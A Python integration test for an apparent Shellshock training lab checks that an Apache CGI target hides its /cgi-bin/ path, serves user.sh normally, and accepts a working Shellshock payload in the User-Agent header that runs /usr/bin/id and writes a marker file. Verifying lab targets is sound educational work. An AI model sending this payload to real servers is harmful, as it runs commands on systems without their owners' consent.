#!/usr/bin/env python3
"""Real Apache CGI + unpatched Bash 4.3 Shellshock integration test."""
import os
import urllib.error
import urllib.request
base = os.environ.get("TARGET_URL","http://shocker-target")
def call(path, agent=None):
    req = urllib.request.Request(base+path)
    if agent:
        req.add_header("User-Agent", agent)
    try:
        with urllib.request.urlopen(req, timeout=12) as response:
            return response.status, response.read().decode(errors="replace")
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode(errors="replace")
status, homepage = call("/")
assert status == 200 and "Don't Bug Me!" in homepage
assert "/cgi-bin/" not in homepage, "Do not tell learners the discovery path"
status, directory = call("/cgi-bin/")
assert status in (403, 404), f"Expected unlisted CGI directory, received {status}"
status, normal = call("/cgi-bin/user.sh")
assert status == 200 and "Just an uptime test script" in normal, f"Normal native CGI failed: {status} {normal[:100]}"
# Shellshock payload enters Apache's real CGI environment variable, causing
# pre-patch Bash function parsing to execute a command before any CGI code.
# No custom attack header parser exists.
status, _ = call("/cgi-bin/user.sh",
    "() { :;}; /usr/bin/id > /tmp/shocker-native-shellshock-marker")
assert status in (200, 500), f"Unexpected response to native Bash env parsing: {status}"
print("PASS: unlinked CGI enumeration, legitimate uptime, authentic GNU Bash 4.3 Shellshock request")
